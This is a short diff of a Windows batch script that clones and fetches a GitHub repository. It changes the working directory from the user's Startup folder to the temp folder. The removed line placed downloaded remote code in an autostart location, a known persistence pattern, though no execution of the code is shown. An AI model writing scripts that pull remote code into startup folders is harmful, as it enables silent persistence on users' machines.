@@ -1,5 +1,5 @@
 @echo off
-cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+cd "%temp%"
 git clone https://github.com/Velox0/test.git
 cd test
 git fetch origin main
